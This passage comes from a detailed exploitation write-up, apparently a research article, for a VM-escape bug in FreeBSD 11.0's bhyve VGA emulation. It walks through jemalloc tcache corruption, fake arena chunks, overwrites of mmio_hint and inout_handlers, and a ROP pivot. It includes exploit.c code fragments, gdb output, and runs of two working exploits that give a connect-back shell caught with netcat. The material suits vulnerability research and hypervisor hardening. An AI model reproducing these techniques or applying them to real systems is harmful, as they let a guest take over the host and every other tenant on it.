+                                      mem_read, mem_write,
+&entry->mr_param);
+        . . .
+}
+
+vmm_emulate_instruction() further calls into instruction specific handlers
+like emulate_movx(), emulate_movs() etc. based on the opcode type. The
+wrappers mem_read() and mem_write() in mem.c call the registered handlers
+with corresponding 'mem_range' structure for a virtual device.
+
+int
+vmm_emulate_instruction(void *vm, int vcpuid, uint64_t gpa, struct vie
+*vie,
+    struct vm_guest_paging *paging, mem_region_read_t memread,
+    mem_region_write_t memwrite, void *memarg)
+{
+        . . .
+        switch (vie->op.op_type) {
+        . . .
+        case VIE_OP_TYPE_MOVZX:
+                error = emulate_movx(vm, vcpuid, gpa, vie,
+                                     memread, memwrite, memarg);
+                break;
+        . . .
+}
+
+static int
+emulate_movx(void *vm, int vcpuid, uint64_t gpa, struct vie *vie,
+             mem_region_read_t memread, mem_region_write_t memwrite,
+             void *arg)
+{
+        . . .
+        switch (vie->op.op_byte) {
+        case 0xB6:
+        . . .
+                error = memread(vm, vcpuid, gpa, &val, 1, arg);
+        . . .
+}
+
+static int
+mem_read(void *ctx, int vcpu, uint64_t gpa, uint64_t *rval, int size, void
+*arg)
+{
+        int error;
+        struct mem_range *mr = arg;
+        error = (*mr->handler)(ctx, vcpu, MEM_F_READ, gpa, size,
+                               rval, mr->arg1, mr->arg2);
+        return (error);
+}
+
+static int
+mem_write(void *ctx, int vcpu, uint64_t gpa, uint64_t wval, int size, void
+*arg)
+{
+        int error;
+        struct mem_range *mr = arg;
+        error = (*mr->handler)(ctx, vcpu, MEM_F_WRITE, gpa, size,
+                               &wval, mr->arg1, mr->arg2);
+        return (error);
+}
+
+By overwriting the mmio_hint[0], i.e. cache of vCPU0, the guest can control
+the entire 'mmio_rb_range' structure during the lookup for MMIO emulation.
+Guest further gains control of RIP during the call to mem_read() or
+mem_write(), since mr->handler can point to an arbitrary value. The
+corrupted handler 'mr->handler' takes 8 arguments in total. The last two
+arguments, 'mr->arg1' and 'mr->arg2' therefore gets pushed on to the stack.
+This gives some control over the stack, which could be used for stack
+pivot.
+
+In summary, corrupt jemalloc thread cache, use ACPI event handling to
+allocate mevent structure in guest, modify the list pointers, delete the
+event to trigger an unlink, use the unlink to overwrite 'mmio_hint[0]' to
+gain control of RIP.
+
+       +--------------------------+                                      
+       |                          |                                      
++------v-----++------------+      |                                      
+|mmio_hint[0]||mmio_hint[1]|      |                                      
++------------++------------+      |                                      
++-----------------------+----+----+-------------------------------------+
+|          Heap         |....|    |             Guest Memory            |
+|                       |....|+---+-----------------------------------+ |
+|                       |....||   |    2MB Huge Page                  | |
+|                       |....|| +-+---------------+                   | |
+|                       |....|| | |   mevent      |                   | |
+|+---------+ +--------+ |....|| | | +-----------+ |                   | |
+||vga_softc| |tcache_s| |....|| | | |   next    +-+----------+        | |
+||         | | vCPU0  | |....|| | | +-----------+ |          |        | |
+|+---------+ +---+----+ |....|| | | +-----------+ | +--------v--------+ |
+|                |      |....|| | +-+ previous  | | |     Fake        | |
+|                |      |....|| |   +-----------+ | |  mmio_rb_range  | |
+|                |      |....|| +---------^-------+ +-----------------+ |
+|                |      |....|+-----------+---------------------------+ |
++----------------+------+----+------------+-----------------------------+
+                 |                        |                              
+                 |                        |                              
+                 +------------------------+                              
+
+It is possible to derive the address of mmio_hint[0] allocated in the bss
+segment by leaking the 'power_button_handler' function address (section
+3.5) in 'mevent' structure. But due to the lack of PIE and ASLR, the
+hardcoded address of mmio_hint[0] was directly used in the proof of concept
+exploit code.
+
+----[ 3.7 - Faking arena_chunk_s structure for arbitrary free
+
+During mevent_delete(), jemalloc frees a pointer which is not part of the
+allocator managed memory as the mevent structure was allocated in guest
+system memory by corrupting tcache structure (section 3.3). This will
+result in a segmentation fault unless a fake arena_chunk_s structure is set
+up before the free(). Freeing arbitrary pointer is already discussed in
+research [6], however, we will take a second look for the exploitation of
+this bug.
+
+JEMALLOC_ALWAYS_INLINE void
+arena_dalloc(tsdn_t *tsdn, void *ptr, tcache_t *tcache, bool slow_path)
+{
+        arena_chunk_t *chunk;
+        size_t pageind, mapbits;
+        . . .
+        chunk = (arena_chunk_t *)CHUNK_ADDR2BASE(ptr);
+        if (likely(chunk != ptr)) {
+                pageind = ((uintptr_t)ptr - (uintptr_t)chunk) >> LG_PAGE;
+                mapbits = arena_mapbits_get(chunk, pageind);
+                assert(arena_mapbits_allocated_get(chunk, pageind) != 0);
+                if (likely((mapbits & CHUNK_MAP_LARGE) == 0)) {
+                        /* Small allocation. */
+                        if (likely(tcache != NULL)) {
+                                szind_t binind =
+arena_ptr_small_binind_get(ptr,
+                                    mapbits);
+                                tcache_dalloc_small(tsdn_tsd(tsdn), tcache,
+ptr,
+                                    binind, slow_path);
+        . . .
+}
+
+Request to free a pointer is handled by arena_dalloc() in arena.h of
+jemalloc. The CHUNK_ADDR2BASE() macro gets the chunk address from the
+pointer to be freed. The arena_chunk_s header has a dynamically sized
+map_bits array, which holds the properties of pages within the chunk.
+
+/* Arena chunk header. */
+struct arena_chunk_s {
+        . . .
+        extent_node_t           node;
+        /*
+         * Map of pages within chunk that keeps track of free/large/small.
+         * The
+         * first map_bias entries are omitted, since the chunk header does
+         * not
+         * need to be tracked in the map.  This omission saves a header
+         * page
+         * for common chunk sizes (e.g. 4 MiB).
+         */
+        arena_chunk_map_bits_t  map_bits[1]; /* Dynamically sized. */
+};
+
+The page index 'pageind' in arena_dalloc() for the pointer to be freed is
+calculated and used as index into 'map_bits' array of 'arena_chunk_s'
+structrue. This is done using arena_mapbits_get() to get the 'mapbits'
+value. The series of calls invoked during arena_mapbits_get() are
+arena_mapbits_get() -> arena_mapbitsp_get_const() -> 
+arena_mapbitsp_get_mutable() -> arena_bitselm_get_mutable()
+
+JEMALLOC_ALWAYS_INLINE arena_chunk_map_bits_t *
+arena_bitselm_get_mutable(arena_chunk_t *chunk, size_t pageind)
+{
+        . . .
+        return (&chunk->map_bits[pageind-map_bias]);
+}
+
+The 'map_bias' variable defines the number of pages used by chunk header,
+which does not need tracking and can be omitted. The 'map_bias' value is
+calculated in arena_boot() of arena.c file, whose value, in this case, is
+13. arena_ptr_small_binind_get() gets the bin index 'binind' from the
+encoded 'map_bits' value in 'arena_chunk_s' structure. Once this
+information is fetched, tcache_dalloc_small() no longer uses arena chunk
+header but relies on information from thread-specific data and thread cache
+structures.
+
+Hence the essential part of fake 'arena_chunk_s' structure is that,
+'map_bits' should be set up in a way 'pageind - map_bias' calculation in
+arena_bitselm_get_mutable() points to an entry in 'maps_bits' array, which
+has an index value to a valid tcache bin. In this case, the index is set to
+4, i.e. bin handling regions of size 64 bytes.
+
+Since 'map_bias' is 13 pages, the usable pages could be placed after these
+fake header pages. An elegant way to achieve this is to request a 2MB
+(chunk size) contiguous memory from the guest which gets allocated as part
+of the guest system. Allocating a contiguous 2MB virtual memory in guest
+does not result in contiguous virtual memory allocation in the host. To
+force the allocation to be contiguous in both guest and bhyve host process,
+request memory using mmap() to allocate a 2MB huge page with MAP_HUGETLB
+flag set.
+
+---[ exploit.c ]---
+. . .
+        shared_gva = mmap(0, 2 * MB, PROT_READ | PROT_WRITE,
+		MAP_HUGETLB | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
+-1, 0);
+	. . . 	
+        shared_gpa = gva_to_gpa((uint64_t)shared_gva);
+        shared_hva = base_address + shared_gpa;
+   	
+        /* setting up fake jemalloc chunk */
+        arena_chunk = (struct arena_chunk_s *)shared_gva;
+
+        /* set bin index, also dont set CHUNK_MAP_LARGE */
+        arena_chunk->map_bits[4].bits = (4 << CHUNK_MAP_BININD_SHIFT);
+
+        /* calculate address such that pageind - map_bias point to tcache
+ * bin size 64 (i.e. index 4) */
+        fake_tbin_hva = shared_hva + ((4 + map_bias) << 12);
+        fake_tbin_gva = shared_gva + ((4 + map_bias) << 12);
+. . .
+
++---------------------------+-------+-----------------------------------+
+|           Heap            |       |           Guest Memory            |
+|                           |       | +----------------------------+    |
+|  +---------+  +--------+  | Guard | | 2MB Huge Page              |    |
+|  |vga_softc|  |tcache_s|  | Page  | | +-------------+ +--------+ |    |
+|  |         |  | vCPU0  |  |       | | |     Fake    | | mevent | |    |
+|  +---------+  +----+---+  |       | | |arena_chunk_s| |        | |    |
+|                    |      |       | | +-------------+ +----^---+ |    |
+|                    |      |       | +----------------------+-----+    |
++--------------------+------+-------+------------------------+----------+
+                     |                                       |           
+                     |                                       |           
+                     +---------------------------------------+    
+
+
+Now arbitrary pointer can be freed to overwrite 'mmio_hint' using
+mevent_delete() without a segmentation fault. The jemalloc version used in
+FreeBSD 11.0 does not check if pageind > map_bias, unlike the one seen in
+android [6]. Hence the fake chunk can also be set up in a single page like
+below:
+
+. . .
+        arena_chunk = (struct arena_chunk_s *)shared_gva;
+        arena_chunk->map_bits[-map_bias].bits = (4 <<
+CHUNK_MAP_BININD_SHIFT);
+
+        fake_tbin_hva = shared_hva + sizeof(struct arena_chunk_s);
+        fake_tbin_gva = shared_gva + sizeof(struct arena_chunk_s);
+. . .
+
+Since the address to be freed is part of the same page as the chunk header,
+the 'pageind' value would be 0. 'chunk->map_bits[pageind-map_bias]' in
+arena_bitselm_get_mutable() would end up accessing 'extent_node_t node'
+element of 'arena_chunk_s' structure since 'pageind-map_bias' is negative.
+One has to just set up the bin index here for a successful free().
+
+----[ 3.8 - Code execution using MMIO vCPU cache
+
+The MMIO cache 'mmio_hint' of vCPU0 is overwritten during mevent_delete()
+with a pointer to fake mmio_rb_range structure. The fake structure is set
+up like below:
+
+---[ exploit.c ]---
+. . .
+        /* pci_emul_fallback_handler will return without error */
+       mmio_range_gva->mr_param.handler  = (void
+*)pci_emul_fallback_handler;
+       mmio_range_gva->mr_param.arg1     = (void *)0x4444444444444444;   //
+arg1 will be corrupted on mevent delete 
+       mmio_range_gva->mr_param.arg2     = 0x4545454545454545;           //
+arg2 is fake RSP value for ROP. Fix this now or later
+       mmio_range_gva->mr_param.base     = 0;
+       mmio_range_gva->mr_param.size     = 0;
+       mmio_range_gva->mr_param.flags    = 0;                            
+       mmio_range_gva->mr_end            = 0xffffffffffffffff;
+. . .
+
+The 'mr_base' value is set to 0, and 'mr_end' is set to 0xffffffffffffffff
+i.e. entire range of physical address. Hence any MMIO access in the guest
+will end up using the fake mmio_rb_structure in emulate_mem():
+
+int
+emulate_mem(struct vmctx *ctx, int vcpu, uint64_t paddr, struct vie *vie,
+    struct vm_guest_paging *paging)
+
+{
+        . . .
+        if (mmio_hint[vcpu] &&
+            paddr >= mmio_hint[vcpu]->mr_base &&
+            paddr <= mmio_hint[vcpu]->mr_end) {
+                entry = mmio_hint[vcpu];
+        . . .
+}
+
+If the entire range of physical address is not used, any valid MMIO access
+to an address outside the range of fake 'mr_base' and 'mr_end' before the
+exploit triggers an MMIO access, will end up updating the 'mmio_hint'
+cache. The 'mmio_hint' overwrite becomes useless!
+
+As a side effect of unlink operation in mevent_delete(), 'mr_param.arg1' is
+corrupted. It is necessary to make sure the corrupted value of
+'mr_param.arg1' is not used for any MMIO access before the exploit itself
+triggers. To ensure this, setup 'mr_param.handler' with a pointer to
+function returning 0, i.e. success. Returning any other value would trigger
+an error on emulation, leading to abort() in vm_loop() of bhyverun.c. The
+ideal choice turned out to be pci_emul_fallback_handler() defined in
+pci_emul.c as below:
+
+static int
+pci_emul_fallback_handler(struct vmctx *ctx, int vcpu, int dir, uint64_t
+addr,
+			  int size, uint64_t *val, void *arg1, long arg2)
+{
+	/*
+	 * Ignore writes; return 0xff's for reads. The mem read code
+	 * will take care of truncating to the correct size.
+	 */
+	if (dir == MEM_F_READ) {
+		*val = 0xffffffffffffffff;
+	}
+	return (0);
+}
+
+After overwriting 'mmio_hint[0]', both 'mr_param.arg1' and
+'mr_param.handler' needs to be fixed for continuing with the exploitation.
+First overwrite 'mr_param.arg1' with address to 'pop rsp; ret' gadget, then
+overwrite 'mr_param.handler' with address to 'pop register; ret' gadget.
+This will make sure that the gadget is not triggered with a corrupted
+'mr_param.arg1' value during a MMIO access. 'mr_param.arg2' should point to
+the fake stack with ROP payload. When the fake handler is executed during
+MMIO access, 'pop register; ret' pops the saved RIP and returns into the
+'pop rsp' gadget. 'pop rsp' pops the fake stack pointer 'mr_param.arg2' and
+executes the ROP payload.
+
+---[ exploit.c ]---
+. . .
+        /* fix the mmio handler */
+        mmio_range_gva->mr_param.handler = (void *)pop_rbp;
+        mmio_range_gva->mr_param.arg1 = (void *)pop_rsp;                
+        mmio_range_gva->mr_param.arg2 = rop;                    
+    	
+        mmio = map_phy_address(0xD0000000, getpagesize());
+        mmio[0];
+. . .
+
+Running the VM escape exploit gives a connect back shell to the guest with
+the following output:
+
+root@linuxguest:~/setupA/vga_fakearena_exploit# ./exploit 192.168.182.148
+6969
+exploit: [+] CPU affinity set to vCPU0
+exploit: [+] Reading bhyve process memory...
+exploit: [+] Leaked tcache avail pointers @ 0x801b71248
+exploit: [+] Leaked tbin avail pointer = 0x823c10000
+exploit: [+] Offset of tbin avail pointer = 0xfcf60
+exploit: [+] Leaked vga_softc @ 0x801a74000
+exploit: [+] Guest base address = 0x802000000
+exploit: [+] Disabling ACPI shutdown to free mevent struct...
+exploit: [+] Shared data structures mapped @ 0x811e00000
+exploit: [+] Overwriting tbin avail pointers...
+exploit: [+] Enabling ACPI shutdown to reallocate mevent struct...
+exploit: [+] Leaked .text power_button_handler address = 0x430380
+exploit: [+] Modifying mevent structure next and previous pointers...
+exploit: [+] Disabling ACPI shutdown to overwrite mmio_hint using fake
+mevent struct...
+exploit: [+] Preparing connect back shellcode for 192.168.182.148:6969
+exploit: [+] Shared payload mapped @ 0x811c00000
+exploit: [+] Triggering MMIO read to trigger payload
+root@linuxguest:~/setupA/vga_fakearena_exploit#
+
+renorobert@linuxguest:~$ nc -vvv -l 6969
+Listening on [0.0.0.0] (family 0, port 6969)
+Connection from [192.168.182.146] port 6969 [tcp/*] accepted (family 2,
+sport 35381)
+uname -a
+FreeBSD  11.0-RELEASE-p1 FreeBSD 11.0-RELEASE-p1 #0 r306420: Thu Sep 29
+01:43:23 UTC 2016
+root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
+
+--[ 4 - Other exploitation strategies
+
+This section details about other ways to exploit the bug by corrupting
+structures used for I/O port emulation and PCI config space emulation.
+
+----[ 4.1 - Allocating a region into another size class for free()
+
+Section 3.7 details about setting up fake arena chunk headers to free an
+arbitrary pointer during the call to mevent_delete(). However, there is an
+alternate way to achieve this by allocating the mevent structure as part of
+an existing thread cache allocation. 
+
+The address of 'vga_softc' structure can be calculated as described in
+section 3.3 by leaking the tbins[4].avail pointer. The main 'mevent' thread
+allocates 'vga_softc' structure as part of bins handling regions of size
+0x800 bytes. By overwriting tbin[4].avail[-ncached] pointer of vCPU0 thread
+with the address of region adjacent to vga_softc structure, we can force
+mevent structure allocated by 'vCPU0' thread, to be allocated as part of
+memory managed by 'mevent' thread.
+
+Since the 'mevent' structure is allocated after 'vga_softc' structure, the
+out of bound write can be used to overwrite the next and previous pointers
+used for unlinking. During free(), the existing chunk headers of the bins
+servicing regions of size 0x800 are used, allowing a successful free()
+without crashing. In general, jemalloc allows freeing a pointer within an
+allocated run [6].
+
+----[ 4.2 - PMIO emulation and corrupting inout_handlers structures
+
+Understanding port-mapped I/O emulation in bhyve provides powerful
+primitives when exploiting a vulnerability. In this section, we will see
+how this can be leveraged for accessing parts of heap memory which was
+previously not accessible. VM exits caused by I/O access invokes the
+vmexit_inout() handler in  bhyverun.c. vmexit_inout() further calls
+emulate_inout() in inout.c for emulation.
+
+I/O port handlers and other device specific information are maintained in
+an array of 'inout_handlers' structure defined in inout.c:
+
+#define MAX_IOPORTS     (1 << 16)
+
+static struct {
+        const char      *name;
+        int             flags;
+        inout_func_t    handler;
+        void            *arg;
+} inout_handlers[MAX_IOPORTS];
+
+Virtual devices register callbacks for I/O port by calling register_inout()
+in inout.c, which populates the 'inout_handlers' structure:
+
+int
+register_inout(struct inout_port *iop)
+{
+        . . .
+        for (i = iop->port; i < iop->port + iop->size; i++) {
+                inout_handlers[i].name = iop->name;
+                inout_handlers[i].flags = iop->flags;
+                inout_handlers[i].handler = iop->handler;
+                inout_handlers[i].arg = iop->arg;
+        }
+        . . .
+}
+
+emulate_inout() function uses the information from 'inout_handlers' to
+invoke the respective registered handler as below:
+
+int
+emulate_inout(struct vmctx *ctx, int vcpu, struct vm_exit *vmexit, int
+strict)
+{
+        . . .
+        bytes = vmexit->u.inout.bytes;
+        in = vmexit->u.inout.in;
+        port = vmexit->u.inout.port;
+        . . .
+        handler = inout_handlers[port].handler;
+        . . .
+        flags = inout_handlers[port].flags;
+        arg = inout_handlers[port].arg;
+        . . .
+                retval = handler(ctx, vcpu, in, port, bytes, &val, arg);
+        . . .
+}
+
+Overwriting 'arg' pointer in 'inout_handlers' structure could provide
+interesting primitives. In this case, VGA emulation registers its I/O port
+handler vga_port_handler() defined in vga.c for the port range of 0x3C0 to
+0x3DF with 'vga_softc' structure as 'arg'.
+
+void *
+vga_init(int io_only)
+{
+        . . .
+        sc = calloc(1, sizeof(struct vga_softc));
+
+        bzero(&iop, sizeof(struct inout_port));
+        iop.name = "VGA";
+        for (port = VGA_IOPORT_START; port <= VGA_IOPORT_END; port++) {
+                iop.port = port;
+                iop.size = 1;
+                iop.flags = IOPORT_F_INOUT;
+                iop.handler = vga_port_handler;
+                iop.arg = sc;
+
+                error = register_inout(&iop);
+                assert(error == 0);
+        }
+        . . .
+}
+
+Going back to the patch in section 2, it is noticed that dac_rd_index,
+dac_rd_subindex, dac_wr_index, dac_wr_subindex are all signed integers.
+Hence by overwriting 'arg' pointer with the address of fake 'vga_softc'
+structure in heap and dac_rd_index/dac_wr_index set to negative values, the
+guest can access memory before 'dac_palette' array. Specifically, the 'arg'
+pointer of DAC_DATA_PORT (0x3c9) needs to be overwritten since it handles
+read and write access to the 'dac_palette' array. 
+
+---[ exploit.c ]---
+. . .
+        /* setup fake vga_softc structure */
+        memset(&vga_softc, 0, sizeof(struct vga_softc));
+        chunk_hi_offset = CHUNK_ADDR2OFFSET(vga_softc_bins[2] +
+                                get_offset(struct vga_softc,
+vga_dac.dac_palette));
+
+        /* set up values for reading the heap chunk */
+        vga_softc.vga_dac.dac_rd_subindex = -chunk_hi_offset;
+        vga_softc.vga_dac.dac_wr_subindex = -chunk_hi_offset;
+. . .
+
+
+Therefore instead of overwriting 'mmio_hint' using mevent_delete() unlink,
+the exploit overwrites 'arg' pointer of I/O port handler to gain access to
+other parts of heap which were earlier not reachable during the linear out
+of bounds access. Hardcoded address of 'inout_handlers' structure is used
+in the exploit code as done with 'mmio_hint' previously due to the lack of
+PIE and ASLR. The offset to the start of the chunk from the fake
+'vga_softc' structure (vga_dac.dac_palette) can be calculated using the
+jemalloc CHUNK_ADDR2OFFSET() macro. 
+
++----------------------++----------------------++----------------------+ 
+|inout_handlers[0]     ||inout_handlers[0x3C9] ||inout_handlers[0xFFFF]| 
++----------------------++----+------^----+-----++----------------------+ 
+      Before                 |      |    |                               
+    Overwrite----------------+      |    |  After                        
+         |       +------------------+    |Overwrite                      
++--------+-------+-----------------------+-------------------------+----+
+|        |       |                Heap   |                         |....|
+| +------+-------+-----------------------+------+                  |....|
+| | +----v----+ ++----------------+ +----v----+ |      +--------+  |....|
+| | |         | ||    mevent      | |         | |      |        |  |....|
+| | |         | || +-----------+  | |         | |      |        |  |....|
+| | |  Real   | || |   next    +--+->  Fake   | |      |tcache_s|  |....|
+| | |vga_softc| || +-----------+  | |vga_softc| |      | vCPU0  |  |....|
+| | |         | || +-----------+  | |         | |      |        |  |....|
+| | |         | |+-+ previous  |  | |         | |      |        |  |....|
+| | |         | |  +-----------+  | |         | |      |        |  |....|
+| | +---------+ +---------------^-+ +---------+ |      +----+---+  |....|
+| |  region[0]       region[1]  |    region[2]  |           |      |....|
+| +-----------------------------+---------------+           |      |....|
++-------------------------------+---------------------------+------+----+
+                                |                           |            
+                                |                           |            
+                                |                           |            
+                                +---------------------------+            
+
+Corrupting 'inout_handlers' structure can also be leveraged for a full
+process r/w, which is described later in section 7.2
+
+----[ 4.3 - Leaking vmctx structure
+
+Section 3.4 details the advantages of leaking the guest system base address
+for exploitation. An elegant way to achieve this is by leaking the 'vmctx'
+structure, which holds a pointer 'baseaddr' to the guest system memory.
+'vmctx' structure is defined in libvmmapi/vmmapi.c and gets initialized in
+vm_setup_memory() as seen in section 3.1
+
+struct vmctx {
+        int     fd;
+        uint32_t lowmem_limit;
+        int     memflags;
+        size_t  lowmem;
+        size_t  highmem;
+        char    *baseaddr;
+        char    *name;
+};
+
+By reading the jemalloc chunk using DAC_DATA_PORT after setting up fake
+'vga_softc' structure, the 'vmctx' structure along with 'baseaddr' pointer
+can be leaked by the guest.
+
+----[ 4.4 - Overwriting MMIO Red-Black tree node for RIP control
+
+Overwriting the 'arg' pointer of DAC_DATA_PORT port with fake 'vga_softc'
+structure opens up the opportunity to overwrite many other callbacks other
+than 'mmio_hint' to gain RIP control. However, overwriting MMIO callbacks
+is still a nice option since it provides ways to control stack for stack
+pivot as detailed in sections 3.6 and 3.8. But instead of overwriting
+'mmio_hint', guest can directly overwrite a specific red-black tree node
+used for MMIO emulation.
+
+The ideal choice turns out to be the node in 'mmio_rb_fallback' tree
+handling access to memory that is not allocated to the system memory or PCI
+devices. This part of memory is not frequently accessed, and overwriting it
+does not affect other guest operations. To locate this red-black tree node,
+search for the address of function pci_emul_fallback_handler() in the heap
+which is registered during the call to init_pci() function defined in
+pci_emul.c
+
+int
+init_pci(struct vmctx *ctx)
+{
+        . . .
+        lowmem = vm_get_lowmem_size(ctx);
+        bzero(&mr, sizeof(struct mem_range));
+        mr.name = "PCI hole";
+        mr.flags = MEM_F_RW | MEM_F_IMMUTABLE;
+        mr.base = lowmem;
+        mr.size = (4ULL * 1024 * 1024 * 1024) - lowmem;
+        mr.handler = pci_emul_fallback_handler;
+        error = register_mem_fallback(&mr);
+        . . .
+}
+
+To gain RIP control like 'mmio_hint' technique, overwrite the handler, arg1
+and arg2, then access a memory not allocated to system memory or PCI
+devices. Below is the output of full working exploit: 
+
+root@linuxguest:~/setupA/vga_ioport_exploit# ./exploit 192.168.182.148 6969
+exploit: [+] CPU affinity set to vCPU0
+exploit: [+] Reading bhyve process memory...
+exploit: [+] Leaked tcache avail pointers @ 0x801b71248
+exploit: [+] Leaked tbin avail pointer = 0x823c10000
+exploit: [+] Offset of tbin avail pointer = 0xfcf60
+exploit: [+] Leaked vga_softc @ 0x801a74000
+exploit: [+] Disabling ACPI shutdown to free mevent struct...
+exploit: [+] Overwriting tbin avail pointers...
+exploit: [+] Enabling ACPI shutdown to reallocate mevent struct...
+exploit: [+] Writing fake vga_softc and mevents into heap
+exploit: [+] Trigerring unlink to overwrite IO handlers
+exploit: [+] Reading the chunk data...
+exploit: [+] Guest baseaddr from vmctx : 0x802000000
+exploit: [+] Preparing connect back shellcode for 192.168.182.148:6969
+exploit: [+] Shared memory mapped @ 0x816000000
+exploit: [+] Writing fake mem_range into red black tree
+exploit: [+] Triggering MMIO read to trigger payload
+root@linuxguest:~/setupA/vga_ioport_exploit#
+
+renorobert@linuxguest:~$ nc -vvv -l 6969
+Listening on [0.0.0.0] (family 0, port 6969)
+Connection from [192.168.182.146] port 6969 [tcp/*] accepted (family 2,
+sport 14901)
+uname -a
+FreeBSD  11.0-RELEASE-p1 FreeBSD 11.0-RELEASE-p1 #0 r306420: Thu Sep 29
+01:43:23 UTC 2016
+root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64
+
+----[ 4.5 - Using PCI BAR decoding for RIP control
+
+All the techniques discussed so far depends on the SMI handler's ability to
+allocate and free memory, i.e. unlinking mevent structure. This section
+discusses another way to allocate/deallocate memory using PCI
+config space emulation and further explore ways to exploit the bug without
+running into jemalloc arbitrary free() issue.
+
+Bhyve emulates access to config space address port 0xCF8 and config space
+data port 0xCFC using pci_emul_cfgaddr() and pci_emul_cfgdata() defined in
+pci_emul.c. pci_emul_cfgdata() further calls pci_cfgrw() for handling r/w
+access to PCI configuration space. The interesting part of emulation for
+the exploitation of this bug is the access to the command register.
+
+static void
+pci_cfgrw(struct vmctx *ctx, int vcpu, int in, int bus, int slot, int func,
+    int coff, int bytes, uint32_t *eax)
+{
+       . . .
+                } else if (coff >= PCIR_COMMAND && coff < PCIR_REVID) {
+                        pci_emul_cmdsts_write(pi, coff, *eax, bytes);
+       . . .
+}
+
+The PCI command register is at an offset 4 bytes into the config space
+header. When the command register is accessed, pci_emul_cmdsts_write() is
+invoked to handle the access.
+
+static void
+pci_emul_cmdsts_write(struct pci_devinst *pi, int coff, uint32_t new, int
+bytes)
+{
+        . . .
+        cmd = pci_get_cfgdata16(pi, PCIR_COMMAND);      /* stash old value
+*/
+        . . .
+        CFGWRITE(pi, coff, new, bytes);                 /* update config */
+
+        cmd2 = pci_get_cfgdata16(pi, PCIR_COMMAND);     /* get updated
+value */
+        changed = cmd ^ cmd2;
+        . . .
+        for (i = 0; i <= PCI_BARMAX; i++) {
+                switch (pi->pi_bar[i].type) {
+
+        . . .
+                        case PCIBAR_MEM32:
+                        case PCIBAR_MEM64:
+                                /* MMIO address space decoding changed' */
+                                if (changed & PCIM_CMD_MEMEN) {
+                                        if (memen(pi))
+                                                register_bar(pi, i);
+                                        else
+                                                unregister_bar(pi, i);
+                                }
+       . . .
+}
+
+The bit 0 in the command register specifies if the device can respond to
+I/O space access and bit 1 specifies if the device can respond to memory
+space access. When the bits are unset, the respective BARs are
+unregistered. When a BAR is registered using register_bar() or unregistered
+using unregister_bar(), modify_bar_registration() in pci_emul.c is invoked.
+Registering or unregistering a BAR mapping I/O space address, only involves
+modifying 'inout_handlers' array. Interestingly, registering or
+unregistering a BAR mapping memory space address involves allocation and
+deallocation of heap memory. When a memory range is registered for MMIO
+emulation, it gets added to the 'mmio_rb_root' red-black tree. 
+
+Let us consider the case of framebuffer device which allocates 2 memory
+BARs in pci_fbuf_init() function defined in pci_fbuf.c
+
+static int
+pci_fbuf_init(struct vmctx *ctx, struct pci_devinst *pi, char *opts)
+{
+        . . .
+        pci_set_cfgdata16(pi, PCIR_DEVICE, 0x40FB);
+        pci_set_cfgdata16(pi, PCIR_VENDOR, 0xFB5D);
+        . . .
+        error = pci_emul_alloc_bar(pi, 0, PCIBAR_MEM32, DMEMSZ);
+        assert(error == 0);
+
+        error = pci_emul_alloc_bar(pi, 1, PCIBAR_MEM32, FB_SIZE);
+        . . .
+}
+
+The series of calls made during BAR allocation looks like
+pci_emul_alloc_bar() -> pci_emul_alloc_pbar() -> register_bar() -> 
+modify_bar_registration() -> register_mem() -> register_mem_int()
+
+static void
+modify_bar_registration(struct pci_devinst *pi, int idx, int registration)
+{
+        . . .
+        switch (pi->pi_bar[idx].type) {
+        . . . 
+        case PCIBAR_MEM32: 
+        case PCIBAR_MEM64: 
+                bzero(&mr, sizeof(struct mem_range));
+                mr.name = pi->pi_name;
+                mr.base = pi->pi_bar[idx].addr;
+                mr.size = pi->pi_bar[idx].size;
+                if (registration) {
+                        . . .
+                        error = register_mem(&mr);
+                } else  
+                        error = unregister_mem(&mr);
+        . . .
+}
+
+register_mem_int() or unregister_mem() in mem.c handle the actual
+allocation or deallocation. During registration, a 'mmio_rb_range'
+structure is allocated and gets added to the red-black tree. During
+unregister, the same node gets freed using RB_REMOVE().
+
+static int
+register_mem_int(struct mmio_rb_tree *rbt, struct mem_range *memp)
+{
+        . . .
+        mrp = malloc(sizeof(struct mmio_rb_range));
+
+        if (mrp != NULL) {
+        . . .
+                if (mmio_rb_lookup(rbt, memp->base, &entry) != 0)
+                        err = mmio_rb_add(rbt, mrp);
+        . . .
+}
+
+int
+unregister_mem(struct mem_range *memp)
+{
+        . . .
+        err = mmio_rb_lookup(&mmio_rb_root, memp->base, &entry);
+        if (err == 0) {
+        . . .
+                RB_REMOVE(mmio_rb_tree, &mmio_rb_root, entry);
+        . . .
+}
+
+Hence by disabling memory space decoding in the PCI command register, it is
+possible to free 'mmio_rb_range' structure associated with a device. Also,
+by re-enabling the memory space decoding, 'mmio_rb_range' structure can be
+allocated. The same operations can also be triggered by writing to PCI BAR,
+which calls update_bar_address() in pci_emul.c. However, unregister_bar()
+and register_bar() are called together as part of the write operation to
+PCI BAR, unlike independent events when enabling and disabling BAR decoding
+in the command register.
+
+The 'mmio_rb_range' structure is of size 104 bytes and serviced by bins of
+size 112 bytes. When both BARs are unregistered by writing to the command
+register, the pointers to the freed memory is pushed into 'avail' pointers
+of thread cache structure. To allocate the 'mmio_rb_range' structure of
+framebuffer device at an address controlled by guest, overwrite the cached
+pointers in tbins[7].avail array with the address of guest memory as
+detailed in section 3.3 and then re-enable memory space decoding. Below is
+the state of the heap when framebuffer BARs are freed:
+
+(gdb) info threads 
+  Id   Target Id         Frame 
+* 1    LWP 100154 of process 1318 "mevent" 0x000000080121198a in _kevent ()
+* from /lib/libc.so.7
+  2    LWP 100157 of process 1318 "blk-4:0-0" 0x0000000800ebf67c in
+_umtx_op_err () from /lib/libthr.so.3
+  . . .
+  12   LWP 100167 of process 1318 "vcpu 0" 0x00000008012297da in ioctl ()
+from /lib/libc.so.7
+  13   LWP 100168 of process 1318 "vcpu 1" 0x00000008012297da in ioctl ()
+from /lib/libc.so.7
+
+(gdb) thread 12
+[Switching to thread 12 (LWP 100167 of process 1318)]
+#0  0x00000008012297da in ioctl () from /lib/libc.so.7
+
+(gdb) x/gx $fs_base-152
+0x800691898:	0x0000000801b6f000
+
+(gdb) print ((struct tcache_s *)0x0000000801b6f000)->tbins[7] 
+$4 = {tstats = {nrequests = 28}, low_water = 0, lg_fill_div = 1, ncached =
+2, avail = 0x801b72508}
+
+(gdb) x/2gx 0x801b72508-(2*8)
